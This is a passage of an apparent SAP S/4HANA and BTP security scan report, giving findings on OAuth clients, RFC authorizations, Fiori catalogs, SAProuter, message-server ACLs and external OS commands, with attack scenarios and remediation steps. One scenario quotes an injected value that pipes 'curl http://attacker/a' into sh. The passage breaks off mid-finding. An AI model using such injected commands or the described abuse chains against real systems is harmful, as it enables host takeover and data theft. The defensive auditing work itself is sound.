Because service credentials are long-lived and often poorly rotated, the window of abuse can be extensive and hard to detect. Business impact: complete BTP subaccount/application compromise, mass data breach, and a severe audit failure against OAuth 2.0 security best practice (RFC 6819) and least-privilege requirements. A real incident looks like an admin-scoped token issued to a client from an unexpected source, followed by configuration changes and data access far beyond the client's normal behavior. This is high severity because it concentrates catastrophic privilege into a single, often weakly-protected secret.
Affected Items (2)
  • sb-apim-admin — scopes: apim.admin, manage_all
  • sb-test-legacy — scopes: *
Remediation — Step by Step
1. Inventory OAuth clients in the BTP cockpit (Security → OAuth / service instances of XSUAA and their service keys) and review each flagged client's scopes/authorities. 2. For each, determine the minimum scopes the integration actually needs and redefine them in the application's xs-security.json / security descriptor, removing admin and wildcard grants. 3. Split broad clients into multiple purpose-specific clients, each with narrow scopes for one integration scenario. 4. Reserve uaa.admin / platform-admin scopes for a very small number of tightly controlled, human-owned administrative identities, not integration clients. 5. Update and redeploy the affected application/service instance so the reduced scopes take effect, and rotate the client secret. 6. Store client secrets in a secrets manager / BTP credential store; never in code or plain config. 7. Enforce secret rotation and set token lifetimes appropriately. 8. Verify by requesting a token and inspecting its granted scopes (decode the JWT) to confirm only the intended scopes are present, and that admin operations are now refused. 9. Feed token-issuance and admin-scope usage into the SIEM to alert on anomalies. 10. Roll out in a non-prod subaccount first and coordinate with the integration owner. Caution: reducing scopes can break the integration if a needed scope is removed - map real required scopes from the app's behavior before tightening, and stage the change.
References
  • OAuth 2.0 Security Best Practices — RFC 6819
HIGH P3 · 54 OAuth clients using deprecated grant types (password/implicit) INTG-OAUTH-002 ▶
Security Risk
This finding flags OAuth clients configured with deprecated grant types: password (Resource Owner Password Credentials) or implicit. Both grants are removed/forbidden in OAuth 2.1 because of inherent security weaknesses. The password grant requires the client to handle the user's actual username and password, which encourages credential storage, exposes long-term credentials to the client and to interception, and defeats MFA and modern authentication; a compromised client using this grant leaks real user credentials, not just a token. The implicit grant returns access tokens directly in the browser URL/fragment, where they are exposed to browser history, referer headers, and script access, making token leakage and theft substantially easier, with no refresh mechanism forcing insecure workarounds. Attack scenario (password grant): an attacker who compromises the client, or intercepts a call, obtains the plaintext user credentials and reuses them anywhere the user has access, bypassing token scoping and expiry entirely; (implicit grant): an attacker exploits an XSS or referer leak to steal the access token from the URL fragment and replays it. Either way the deprecated flow converts a client compromise into broader credential/token theft that modern flows would have contained. Business impact: credential and token exposure, MFA bypass, account takeover, and non-compliance with OAuth 2.1 and SAP BTP OAuth best practice. A real incident looks like user credentials or tokens harvested from a client using these flows and reused from a foreign location. This is high severity because the grant type itself weakens every authentication built on it. Migrating to modern flows is the definitive fix.
Affected Items (3)
  • sb-apim-admin — grant types: ['client_credentials', 'password']
  • sb-portal-app — grant types: ['authorization_code', 'implicit']
  • sb-test-legacy — grant types: ['password']
Remediation — Step by Step
1. Identify each flagged client and its configured grant types in the BTP cockpit / XSUAA service instance and xs-security.json (oauth2-configuration → grant-types). 2. For service-to-service integrations, migrate to the client_credentials grant (no user context, client secret or, preferably, X.509/mTLS client authentication). 3. For user-facing applications, migrate to authorization_code with PKCE, which is the OAuth 2.1-recommended interactive flow. 4. Remove 'password' and 'implicit' from the grant-types list in the security descriptor and redeploy the service instance. 5. Where the password grant was used to bridge legacy callers, front them with a proper token exchange or a supported flow rather than passing user credentials. 6. Rotate client secrets and any credentials that may have been exposed under the old flow. 7. Ensure redirect URIs are strictly allowlisted for authorization_code clients. 8. Verify by attempting the deprecated grant (expect it to be rejected) and confirming the new flow issues tokens correctly. 9. Decode issued tokens to confirm scopes and audience are correct after migration. 10. Roll out in non-prod first and coordinate with each consuming application team. Caution: switching grant types requires the consuming client code to change simultaneously - plan the migration jointly and stage it, since removing the old grant will immediately break any caller still using it.
References
  • OAuth 2.1 Draft — Deprecated Grant Types
  • SAP BTP — OAuth Configuration Best Practices
HIGH P3 · 54 Integration connections without encryption INTG-TOPO-001 ▶
Security Risk
This finding flags integration connections in the system-to-system topology that are unencrypted or use protocols (HTTP, RFC, FTP, SMTP) without verified TLS/SNC. The topology view captures who-talks-to-whom across S/4HANA, BTP, middleware, and third parties; an unencrypted edge is a clear-text channel carrying business data between systems, exposed to interception and tampering by anyone on the network path. Legacy protocols are the usual offenders: plain RFC without SNC exposes credentials and payloads over a weakly-protected protocol; HTTP exposes tokens and data; FTP transmits credentials and files in clear text; SMTP relays notifications (often containing business/PII content) unencrypted. Attack scenario: an attacker with visibility on an internal segment (via a compromised host, rogue device, or misconfigured switch) captures an FTP login or an RFC session between two systems, harvests the credentials, then uses them to authenticate directly to the target system - turning a passive sniff into active access; alternatively they tamper with an in-flight file or message to inject fraudulent data. Because these are automated, high-volume system links, exposure is continuous and often carries the most sensitive master and transactional data in bulk. Business impact: interception of credentials and business/PII data (GDPR), integrity/fraud risk from tampering, and non-compliance with the SAP Security Baseline requirement for encrypted communications. A real incident looks like credentials sniffed from a clear-text interface and reused for lateral movement, or manipulated data delivered between systems. This is high severity because unencrypted inter-system links are both high-value and continuously exposed.
Affected Items (5)
  • S4HANA_PROD → ECC_LEGACY (protocol: RFC)
  • CPI_BROKER → VENDOR_PORTAL (protocol: HTTP)
  • ECC_LEGACY → CPI_BROKER (protocol: HTTP)
  • S4HANA_PROD → CRM_OLD_5.0 (protocol: RFC)
  • S4HANA_PROD → EDI_GATEWAY (protocol: FTP)
Remediation — Step by Step
1. Review each flagged connection in the topology and identify the underlying technical channel (RFC destination in SM59, HTTP connection, FTP/SFTP job, or mail configuration in SCOT). 2. For RFC links, enable SNC on the SM59 destination (SNC active, partner SNC name, QoP=privacy) and enforce system-wide via snc/enable=1 and snc/data_protection/min=3 (RZ10/RZ11), with CommonCryptoLib and PSEs (STRUST/SNCWIZARD). 3. For HTTP links, switch to HTTPS and configure the SSL client PSE and trusted CA in STRUST; verify the certificate chain. 4. For FTP, migrate to SFTP/FTPS and update the job/interface configuration. 5. For SMTP (SCOT), enable TLS on the mail node and, where content is sensitive, apply message-level protection. 6. For any 'encryption unknown' edges, determine and document the actual transport security rather than assuming. 7. Coordinate certificate/SNC-name exchange with each connected system/partner before switching. 8. Verify each migrated connection with a test transaction and confirm SNC/TLS is active end to end (SM59 connection test, gateway/ICM logs). 9. Add certificate-expiry monitoring for the new SNC/TLS certificates. 10. Roll out per connection in non-prod first, then production in an agreed window. Caution: enabling SNC/TLS requires both endpoints configured together - never enforce before the partner side is ready, and avoid setting snc/accept_insecure_* to reject insecure connections until all links are migrated, or interfaces will drop.
References
  • SAP Security Baseline — Encrypted Communications
HIGH P3 · 54 Missing authorization check in custom ABAP — Z_FI_POSTING_BAPI ATC-AUTHCHK ▶
Security Risk
This was reported by SAP's own code analysis (ABAP Test Cockpit / Code Vulnerability Analyzer) running inside the system, not by this product's scanner. The statement performs a privileged action — reading, writing or deleting business data, calling out to another system, or starting a transaction — without an authorization check that governs it. Authorization in ABAP is not enforced by the database or the runtime; it happens only where a developer writes AUTHORITY-CHECK. A missing check is therefore not a weakened control but an absent one. Any user who can reach the code path can perform the action, regardless of their role, and the failure is invisible in role reviews because there is no role to review.
Affected Items (1)
  • Z_FI_POSTING_BAPI (CLAS) line 45
Remediation — Step by Step
1. Open the object in ADT or SE80 and read the reported statement in context — the line number came from a scan and moves as the code is edited. 2. Add an AUTHORITY-CHECK before the action, against the authorization object that actually governs it — for business data that is the object the standard transaction checks, not a convenient generic one. 3. Check SY-SUBRC immediately after and stop processing when it is non-zero; an unchecked AUTHORITY-CHECK is the same as no check. 4. Maintain the authorization proposal for the object so the check appears in role maintenance and can be reviewed. 5. Verify by executing the path as a user who should be refused, and confirm the refusal. 6. Wire the check into the transport release path so the same defect class cannot be reintroduced by the next change.
References
  • SAP Security Baseline — secure custom code
  • CWE-862

HIGH P3 · 54 Fiori catalogs with public/unrestricted scope FIORI-CAT-001 ▶
Security Risk
The scanner flags Fiori catalogs whose access scope is set to PUBLIC/ALL/EVERYONE/* instead of being bound to specific PFCG business roles. In the standard SAP Fiori Launchpad model a catalog is a container of tiles and target mappings that should reach a user only through a business role carrying the S_UI2_CATALOG authorization object (catalog technical ID) plus the S_SERVICE start authorizations for the underlying OData services. A public catalog short-circuits this: every tile it holds, and the semantic objects/navigation targets behind them, become discoverable and launchable by any authenticated user. In an S/4HANA RISE landscape fronted by SAP Build Work Zone/BTP the equivalent exposure is a catalog surfaced through the BTP Everyone default role collection or a blanket SAP_BR_* reference role assigned to the whole user base. Attack scenario: a low-privileged employee or a compromised dialog account logs into the Launchpad, sees tiles they were never provisioned for, and clicks into semantic objects such as user management, banking, or master-data maintenance. Even where the backend OData check ultimately blocks a write, the UI becomes a reconnaissance map of the entire application surface, and any tile whose backend authorization is weak or missing (see FIORI-ODATA-001) becomes an immediate privilege-escalation path. Business impact: segregation-of-duties breakdown, SOX and GDPR exposure through unintended visibility of finance/HR data, and a materially larger attack surface. A real incident looks like an attacker enumerating a Manage Users or Post Journal Entry tile from an ordinary session and finding at least one that executes.
Affected Items (2)
  • Z_ADMIN_CATALOG — scope: PUBLIC
  • Z_ALL_USERS_CATALOG — scope: PUBLIC
Remediation — Step by Step
1. Enumerate the flagged catalogs in the Fiori Launchpad Designer (transaction /UI2/FLPD_CUST for customizing scope, /UI2/FLPD_CONF for configuration scope) and confirm each catalog's intended audience. 2. In transaction PFCG, ensure every catalog is exposed only through purpose-built business roles: add it on the Menu tab as an SAP Fiori Tile Catalog, never through a role assigned to all users. 3. Remove the catalog from any broadly assigned reference role (SAP_ALL-equivalent copies, blanket SAP_BR_*) and from the BTP/Work Zone Everyone default role collection in the RISE/BTP cockpit. 4. Regenerate the role profile (PFCG > Authorizations > Generate) so S_UI2_CATALOG is restricted to the correct catalog IDs; run SU25/SU24 sync if defaults changed. 5. For spaces/pages deployments confirm the catalog is reachable only via role-assigned pages (see FIORI-SPACE-001). 6. Clear the Launchpad caches with transaction /UI2/CACHE_DEL and recalculate the app index with /UI5/APP_INDEX_CALCULATE. 7. Verify: log on as a representative non-privileged test user and confirm the tiles no longer appear; use transaction SUIM (roles by authorization value, object S_UI2_CATALOG) to list which roles still grant the catalog. 8. Rollout caution: perform in DEV/QA and transport; removing a catalog from a role removes its tiles for those users, so coordinate with content owners and schedule the production import in a low-usage window.
References
  • SAP Fiori — Catalog-Based Authorization
HIGH P3 · 54 Sensitive admin Fiori apps exposed with broad access FIORI-APP-001 ▶
Security Risk
The module maintains a list of high-impact administrative Fiori apps (Manage Users F0733, Manage Business Roles F0735, Communication Arrangements F1962, Communication Systems F2723, Maintain Business Users F1603, Manage Software Components F5765, Display Technical Users F3861, Manage Catalogs F0709, IAM Information System F2917) and flags any that appear in a broadly scoped catalog. These apps are effectively the identity-and-integration control plane of S/4HANA: Manage Users/Business Roles create accounts and grant authorizations; Communication Arrangements/Systems define integration credentials and destinations; Maintain Business Users controls the business-partner-to-user link. Exposing them through a public or widely assigned catalog makes the tiles visible and, if backend authorization is not airtight, actionable to users who should never touch identity administration. Step-by-step attack: an attacker who phished or brute-forced an ordinary business user opens the Launchpad, spots the Manage Business Roles or Manage Users tile, and tries to grant themselves an admin role or reset another user's authorizations; if the backing objects (S_USER_GRP, S_USER_AGR, S_USER_PRO, S_USER_SAS) are not tightly provisioned they achieve full privilege escalation and can create a technical super-user for persistence. Communication Arrangement access lets them exfiltrate integration credentials or repoint an interface to a malicious endpoint. Business impact: complete compromise of the identity system, undetectable fraud through self-granted authorizations, and GDPR/SOX failure against the SAP Security Baseline requirement to segregate administrative functions. A real incident looks like a self-service privilege grant discovered only after fraudulent transactions post.
Affected Items (2)
  • F0733: Manage Users — catalog: Z_ADMIN_CATALOG, scope: PUBLIC
  • F0735: Manage Business Roles — catalog: Z_ADMIN_CATALOG, scope: PUBLIC
Remediation — Step by Step
1. For each flagged app, confirm the semantic object/app ID in the SAP Fiori Apps Reference Library and identify the backing OData services and required authorization objects. 2. In transaction /UI2/FLPD_CUST, move these admin apps out of any broad catalog into a dedicated restricted admin catalog assigned only to administrator business roles. 3. In PFCG, ensure only designated admin roles carry that catalog and the corresponding S_SERVICE start authorizations, and remove the apps from all general-purpose roles. 4. Harden the backend (the decisive control): verify the user-administration objects S_USER_GRP, S_USER_AGR, S_USER_PRO and S_USER_SAS and the communication objects are granted only to admins; never rely on tile visibility for security. 5. Restrict administration to GRC firefighter or PAM-checked-out accounts and enable the Security Audit Log (transaction RSAU_CONFIG, legacy SM19) for these apps and users. 6. Run STAUTHTRACE or SU53 while a legitimate admin uses each app to capture the exact authorizations and build precise least-privilege roles. 7. Verify: log on as a standard test user and confirm the admin tiles are absent, and issue a direct call to the backing OData service in /IWFND/GW_CLIENT to confirm it returns HTTP 403. 8. Rollout caution: coordinate with the IAM/Basis team, transport through DEV/QA, clear caches with /UI2/CACHE_DEL, and confirm legitimate administrators retain access before removing broad assignments in production.
References
  • SAP Fiori — Admin App Authorization Best Practices
HIGH P3 · 54 Sensitive OData services with inadequate authorization FIORI-ODATA-002 ▶
Security Risk
This check targets a curated set of business-critical OData services (API_BUSINESS_PARTNER, API_USER_MANAGEMENT, API_SALES_ORDER, API_PURCHASEORDER, API_JOURNAL_ENTRY, API_BILLING_DOCUMENT, HCM_EMPLOYEE, API_PAYROLL, MANAGE_WORKFORCE, FINANCIALS) that are registered with weak or partial authorization (not full/enabled/standard). Unlike FIORI-ODATA-001, these services may have a start authorization but lack robust value- and field-level enforcement, so the check exists in name but does not adequately constrain what a caller can read or change. These services expose the crown-jewel data domains: finance (journal entries, billing), procurement (purchase orders), sales, HR/payroll and identity. The danger in a RISE/BTP context is that these are exactly the APIs published for integration (SAP Build, Integration Suite/CPI, third-party middleware) and are therefore both widely reachable and attractive. Attack scenario: a user with a legitimate but narrow role calls API_JOURNAL_ENTRY or API_PAYROLL directly and, because the DPC does not enforce company-code, cost-center or infotype-level authorization, reads or posts data far outside their remit, for example pulling the entire payroll dataset or posting a journal entry to a company code they should not touch. The UI would have filtered these; the raw API does not. Business impact: payroll/PII disclosure (GDPR), fraudulent financial postings and SoD violations (SOX), and leakage of business-partner bank data. A real incident looks like a narrow-scope user or integration account pulling far more data than their UI ever showed, discovered during a data-loss review.
Affected Items (3)
  • API_SALES_ORDER_SRV (SO_SRV) — auth: NONE
  • API_USER_MANAGEMENT_SRV (USER_SRV) — auth: DISABLED
  • HCM_EMPLOYEE_MASTER_SRV (EMP_SRV) — auth: NONE
Remediation — Step by Step
1. For each flagged service review the authorization model in /IWFND/MAINT_SERVICE (Service > Assignments) and in transaction SU24 confirm the S_SERVICE default plus the business authorization defaults are complete. 2. Confirm the backend DPC_EXT enforces value-level objects: F_BKPF_BUK (company code) for journal/billing, M_BEST_BSA / M_BEST_EKO for purchase orders, P_ORGIN / P_ORGINCON plus structural authorizations for HCM/payroll, and the business-partner authorization objects for API_BUSINESS_PARTNER. 3. Where the service is custom or extended, raise a development change so AUTHORITY-CHECK fires for every entity set and navigation with the correct org-level fields, and enforce field-level checks where sensitive fields (bank data, salary) are returned. 4. Restrict start access: in PFCG grant S_SERVICE for these services only to the specific roles and integration/technical users that require them, and remove it from general roles. 5. For integration/technical users apply least privilege and prefer OAuth 2.0 scopes (SAP Note 2500104) over broad dialog authorizations. 6. Enable the Security Audit Log (RSAU_CONFIG) and Gateway statistics (transaction /IWFND/STATS) to monitor access to these services. 7. Verify: in /IWFND/GW_CLIENT call each service as a user authorized for only one company code / org unit and confirm records from other org units are NOT returned; capture STAUTHTRACE to prove the checks fire. 8. Rollout caution: tightening value checks can break legitimate cross-org integrations, so profile real usage in QA, align with interface/data owners, stage via transport, and enforce in a maintenance window.
References
  • SAP Fiori — OData Backend Authorization Design
HIGH P3 · 54 Broad RFC authorization (S_RFC RFC_NAME = *) AUTH-006 ▶
Security Risk
The role grants S_RFC with RFC_NAME='*' (function-group type), permitting remote invocation of ANY RFC-enabled function module. S_RFC is the authorization checked when a function module is called over RFC; a wildcard removes the per-function-group gate, so any RFC-reachable account holding this role can call the entire library of remote-enabled FMs. That library includes some of the most abusable modules in the system: RFC_READ_TABLE / RFC_READ_TABLE2 (read the contents of virtually any table, including USR02 password hashes, bank data, and configuration), SXPG_COMMAND_EXECUTE (run external OS commands, see AUTH-003), BAPI_* mass-data modules (create/change master and transactional data), and RFC_PING / system-info modules used for reconnaissance. In an S/4HANA RISE / BTP context this is the primary data-exfiltration and lateral-movement surface: OData services, the Cloud Connector, and integration middleware all reach the ABAP backend over RFC, so an over-broad S_RFC on a service or technical user turns a single credential leak into read/write access to the whole application. The classic attack chain is: obtain a low-value RFC or dialog credential, call RFC_READ_TABLE to dump USR02/USRACL and sensitive business tables, then use a BAPI or SXPG module to escalate or move laterally. A real incident looks like large, unusual RFC traffic from an interface user, bulk reads of sensitive tables with no corresponding application transaction, and is a documented Onapsis/SAP-security abuse pattern. It is a High-severity least-privilege and data-protection (GDPR) exposure.
Affected Items (1)
  • Role Z_DEV_UNRESTRICTED — 1 user(s) [DEV1] — S_RFC RFC_NAME=*
Remediation — Step by Step
1. Identify offenders: run RSUSR002 for S_RFC with RFC_NAME='*'; pay special attention to technical/communication users and roles behind interfaces. 2. Determine what each interface actually calls: run an authorization/UCON trace (STAUTHTRACE, or the UCON RFC monitoring below) over a full processing cycle to capture the real function groups used. 3. In PFCG, replace RFC_NAME='*' with the specific function groups (RFC_TYPE=FUGR) each role/interface requires; scope ACTVT to 16 (execute). 4. Activate UCON (transaction UCONCOCKPIT / UCON RFC scenario): build the allowlist of externally-callable function modules over a logging phase, then switch to active blocking so even authorized users cannot reach modules outside the allowlist. 5. Ensure powerful modules (RFC_READ_TABLE, SXPG_COMMAND_EXECUTE) are not exposed to broad roles and are covered by UCON. 6. Regenerate profiles and re-run RSUSR002 to confirm no assigned role retains RFC_NAME='*'. 7. Verify: from the calling system/middleware, run the interface and confirm it still works with the scoped function groups; confirm a non-allowlisted call is blocked (SM59 test / SU53). 8. Rollout caution: this WILL break interfaces if mis-scoped — coordinate with every interface owner, run UCON in logging mode long enough to capture peak/period-end calls, stage in QA, and keep a documented back-out.
References
  • SAP Note 1416085
  • SAP Help — S_RFC authorization
  • Onapsis — RFC FM abuse
HIGH P3 · 54 SAProuter route table allows wildcard target host/port TRUST-005 ▶
Security Risk
The SAProuter route-permission table (saprouttab) contains permit rules (action P or S) with a wildcard target host and/or target port. SAProuter is the network gatekeeper between the external world (SAP support, partners, sometimes the internet) and the internal SAP network. A rule such as 'P * * *' lets any external client route to any internal host on any port through the router, effectively turning SAProuter into an open proxy into the internal LAN and bypassing firewall segmentation. Attack scenario: an internet-exposed SAProuter (commonly on TCP 3299) with a wildcard permit lets an external attacker route to internal dispatcher ports (32NN), the message server (36NN), the RFC gateway (33NN), HANA SQL (3NN15), or even RDP/SSH. From there they exploit unpatched internal services — the message-server/gateway RCE chains (10KBLAZE, CISA advisory AA19-122A) being the textbook examples. Business impact: full internal-network exposure, remote code execution, data breach, and a common ransomware entry point via an internet-facing SAProuter. A real incident looks like unexpected SAProuter connections to many internal hosts and ports, with router logs showing the wildcard route being used from external sources.
Affected Items (1)
  • P * * 3299 — wildcard target host/port
Remediation — Step by Step
1. Locate the saprouttab file referenced by the SAProuter start command (-R option) and review every line. Syntax is: action(P/S/D) source-host dest-host dest-port [password]. 2. Replace each wildcard permit (dest-host '*' or port '*') with explicit source, destination host and destination port for the one legitimate flow it serves (for example only the SAP support subnet to a specific app server on a specific service). 3. Make the table deny-by-default: end it with 'D * * *' so anything not explicitly permitted is denied, with the narrow permits listed above it. 4. Prefer 'S' (secure/SNC) entries for external SAP support connections and enforce SNC on the router. 5. Reload the router (saprouter -n) to apply the new table, and keep the SAProuter binary patched. 6. Verify with a route/niping test that a non-permitted host/port is now blocked, and review the router trace (dev_rout) for denied attempts. Caution: tightening routes can break legitimate SAP support and interface access — inventory required flows with the network and interface owners first, stage the change, and keep a rollback copy of the original saprouttab.
References
  • SAP Help — SAProuter route permission table
  • SAP Security Baseline — SAProuter
HIGH P3 · 54 Message-server internal/external separation weak TRUST-006 ▶
Security Risk
The message server does not fully separate its internal application-server channel from external client access (rdisp/msserv_internal = 0), or external administration is enabled (ms/monitor is not 0). The message server brokers communication between application servers and load-balances SAP GUI logons. Without a dedicated, firewalled internal port, an external client that can reach the message-server port can register itself as a rogue application server, impersonate a legitimate one, and intercept or steal logon tickets and business data — the mechanism behind the 10KBLAZE / CVE-2019 message-server attacks (CISA AA19-122A). When ms/monitor is greater than 0, external programs such as msmon can administer the message server and change or delete its internal memory. Attack scenario: an attacker who reaches the external message-server port (36NN) registers a fake application server or manipulates the monitor/ACL, harvests SAP logon tickets, and achieves lateral movement or a denial-of-service outage. Business impact: credential theft, system takeover and outage of a core ERP service, with a well-documented, actively-scanned exploit history. A real incident looks like an unknown application server appearing in transaction SMMS, message-server internal memory being manipulated, or a spike in captured logon tickets.
Affected Items (2)
  • rdisp/msserv_internal = 0 (no dedicated internal port — external clients can reach the internal message-server channel)
  • ms/monitor = 1 (external message-server administration allowed)
Remediation — Step by Step
1. In RZ11 review rdisp/msserv, rdisp/msserv_internal, ms/monitor and ms/acl_info. 2. In RZ10 set rdisp/msserv_internal to a dedicated internal port (for example 39NN) and keep the external rdisp/msserv port firewalled away from clients, per the split recommended in SAP Note 1421005. 3. Set ms/monitor = 0 to block external administration, and configure ms/acl_info to point to a restrictive ACL file that lists only your application-server hosts, denying everything else. 4. On the firewall, allow only application servers to reach the internal port; SAP GUI clients should reach only the external logon port. 5. Restart the instances to activate the static parameters (coordinate the window with SAP managed services on RISE). 6. Verify: SMMS shows only legitimate application servers, RZ11 confirms msserv_internal is set and ms/monitor = 0, and an external test host cannot register. Caution: a wrong internal port or an incomplete ms_acl_info host list will break application-server communication and load balancing — change it in a maintenance window, test in non-production, and make sure the ACL host list is complete.
References
  • SAP Note 1421005 — Message server security
  • SAP Security Baseline — Message server
HIGH P3 · 54 Message-server ACL permits any host to register (rogue app server) TRUST-010 ▶
Security Risk
The message-server ACL (ms/acl_info file) 1 permit-all/wildcard rule(s). With a wildcard or empty ACL, any host that can reach the internal message-server port can register as an application server of the SAP system, join the work-process pool, and intercept or inject traffic — the rogue-application-server attack (CISA AA19-122A / '10KBLAZE'). The ms/* parameter checks cannot see this; it is in the ACL rule content.
Affected Items (1)
  • * HOST=* SERVICE=*
Remediation — Step by Step
Populate ms/acl_info with explicit HOST rules listing ONLY the known application servers of this system (no HOST=* / wildcard), and ensure ms/acl_info points at the file. Combine with reginfo/secinfo gateway ACLs.
References
  • SAP Note 821875 — Security settings in the message server (ms/acl_info)
  • CISA AA19-122A / '10KBLAZE' — rogue SAP application server
  • SAP Security Baseline — Message Server ACL
HIGH P3 · 54 CDS view exposes data with authorization checking disabled S4AUTHZ-004 ▶
Security Risk
ABAP CDS views can carry the annotation @AccessControl.authorizationCheck. The secure setting #CHECK evaluates the view's DCL (Data Control Language) access control so only rows the user is authorized for are returned. The values #NOT_REQUIRED and #NOT_ALLOWED switch the DCL check off entirely, so every caller sees all rows regardless of authorization; that is acceptable only for provably non-sensitive or purely technical views. The real danger arises when such a view is EXPOSED, that is published as an OData service, bound to a Fiori app or service binding, or released as a C1-stable public API, because the platform then enforces no row-level authorization on it. Any authenticated user, any consuming BTP side-by-side app, or any external API client can read the entire data set. Attack scenario: an adversary enumerates OData/service endpoints, finds one backed by a #NOT_REQUIRED CDS view over financial documents, business partners, or employee data, and bulk-extracts the table using $top/$skip paging, with no per-record check to stop them. Because the check is disabled at the data-model layer, front-end restrictions and launchpad tile-hiding provide no protection. Impact is a mass confidential/PII data breach (GDPR), leakage of financial data (SOX and data-integrity concerns), and an audit finding that authorization is not enforced at the correct layer. A real incident looks like large scripted OData reads returning far more data than the caller's role should ever allow.
Affected Items (3)
  • ZC_CUSTOMER_MASTER — @AccessControl.authorizationCheck: #NOT_REQUIRED (exposed)
  • ZI_SALES_ORDER_ITEM — @AccessControl.authorizationCheck: #NOT_ALLOWED (exposed)
  • ZC_VENDOR_BANK_DETAIL — @AccessControl.authorizationCheck: #NOT_REQUIRED (exposed)
Remediation — Step by Step
1. Inventory affected views: in ABAP Development Tools (ADT/Eclipse) search CDS sources for @AccessControl.authorizationCheck: #NOT_REQUIRED and #NOT_ALLOWED, and correlate with exposure (@OData.publish, service bindings in /IWFND, or released APIs). 2. For each exposed sensitive view, change the annotation to #CHECK to evaluate DCL, or to #MANDATORY to force a runtime error if no DCL exists so access can never silently be open. 3. Create or adjust a DCL access-control (define role ...) that enforces the intended restriction, typically via aspect pfcg_auth bound to the correct authorization object and fields. 4. Where a view is genuinely non-sensitive/technical, document the rationale so the exception is auditable rather than relying on obscurity. 5. Activate and transport the CDS view and DCL objects through Dev > Q > Prod. 6. For OData exposure, additionally protect the service with S_SERVICE (see S4AUTHZ-005) as defense in depth. 7. Verify: log on as a restricted test user and confirm the exposed service now returns only authorized rows. 8. Confirm the check is actually firing using the authorization trace (transaction STAUTHTRACE) while the service is called. 9. Re-scan the CDS source base to confirm no exposed view still has the check disabled. 10. Rollout caution: enabling DCL can suddenly filter data for existing consumers, so validate in Q with real consumer roles, review DCL performance on large tables, and coordinate with app/interface owners before production.
References
  • SAP Help — CDS Access Control (DCL) / @AccessControl.authorizationCheck
HIGH P3 · 54 External OS command allows runtime additional parameters (ADDPAR) JOBCMD-CMD-002 ▶
Security Risk
Every SM69 command carries an 'Additional Parameters Allowed' flag (table SXPGCOSTAB, field ADDPAR); when set to X, callers may append arguments at run time beyond the fixed parameters in the catalog. This command has ADDPAR = X, so SM49 / SXPG_COMMAND_EXECUTE callers control part of the final command line. The catalog base program can look completely benign (a copy, list, or archive tool) yet still be weaponised through the appended arguments. On many OS targets the appended text can include shell metacharacters, turning an allowlisted command into an OS-command-injection primitive. Even without metacharacters, extra flags can redirect output to sensitive files, change tool behaviour, or point the tool at attacker-controlled input. Attack scenario: command 'ZLIST' = /usr/bin/ls with ADDPAR on; the caller supplies "; curl http://attacker/a | sh" (UNIX) or "& powershell -enc ..." (Windows). Depending on how the target exec path handles it, the appended payload runs as <sid>adm on the application-server host. A lower-privileged functional user who merely holds S_LOG_COM for this command can thus reach the OS layer. This is harder to spot than CMD-001 because the catalog entry itself is safe - only the run-time append is dangerous. Auditors reviewing just the base command sign it off as low risk and miss the exposure entirely. Business impact: host-level command execution and data exposure equivalent to a shell wrap, under a trusted SAP identity. Real incident: an interface command left with ADDPAR 'for flexibility' was used by a functional user to append parameters and exfiltrate a file, past a catalog review that had approved it.
Affected Items (2)
  • ZBADSHELL -> /bin/sh (additional parameters allowed)
  • ZTMP -> /tmp/maint.bin (additional parameters allowed)
Remediation — Step by Step
1. Inventory: SM69 -> open each command and inspect 'Additional Parameters Allowed'; or SE16 on SXPGCOSTAB where ADDPAR = 'X'. 2. For any command without a documented, reviewed need for run-time parameters, clear the 'Additional Parameters Allowed' checkbox in SM69 and save. 3. Where variability is required, move it into fixed values in the 'Parameters' field of the catalog entry so nothing is free-form. 4. Alternatively create a small set of distinct SM69 commands, one per allowed variant, instead of one ADDPAR-enabled command. 5. If free-form input is truly unavoidable, validate/whitelist it in the calling ABAP before SXPG_COMMAND_EXECUTE and reject shell metacharacters. 6. Restrict S_LOG_COM (fields COMMAND, OPSYSTEM, HOST) to a minimal operator group in PFCG; list holders with SUIM. 7. Confirm no armed job step depends on appended parameters (check TBTCP EXTCMD/parameters via SE16) before changing PRD. 8. Verify: SE16 SXPGCOSTAB shows ADDPAR blank for the hardened commands. 9. Regression-test the affected job/interface with only fixed parameters in DEV/QA and confirm it still functions. 10. Rollout caution: clearing ADDPAR can break callers that legitimately pass arguments - identify them via the SM49 log first, transport the change, and avoid editing directly in PRD.
References
  • SAP Help — External OS Commands: Additional Parameters (SM69)
HIGH P3 · 54 External OS command resolves to an unqualified or writable path JOBCMD-CMD-003 ▶
Security Risk
A command whose target program is a bare name, a relative path (./ or ../), or a file in a world-writable/temp directory is a program-resolution hijack waiting to happen. This entry's OPCOMMAND falls into one of those: an unqualified name, a relative path, or a location such as /tmp, /var/tmp, /dev/shm, %TEMP%, C:\Temp, or C:\Windows\Temp. Bare name: the OS resolves it through the PATH of <sid>adm; an attacker who places a same-named binary earlier in PATH (or in the working directory) gets it run instead. Writable location: the attacker needs no PATH trick - they simply drop or replace the file the command points at. Either way, the SAP host executes the attacker's binary as <sid>adm the next time the command or its job runs. Attack scenario: SM69 command 'ZARCH' = archive.sh (bare); an attacker with limited OS access writes a malicious archive.sh into a PATH-early or temp directory. The nightly job triggers it and escalates the attacker from limited OS access to the full <sid>adm identity. Because the SM69 entry itself looks normal, config reviews and change management do not flag it. The result is a persistent, low-noise backdoor that fires automatically on the job's schedule. Business impact in S/4HANA: host takeover as <sid>adm, hence access to the HANA data files, the kernel and transports. It is especially dangerous on shared/temp-heavy hosts where many processes can write the resolution directory. Real incident: a temp-dir helper script referenced without an absolute path let an attacker with limited OS access escalate to <sid>adm just by overwriting the script and waiting for batch.
Affected Items (2)
  • ZBARE -> backup_all (unqualified name (PATH-search hijack))
  • ZTMP -> /tmp/maint.bin (user-writable/temp location)
Remediation — Step by Step
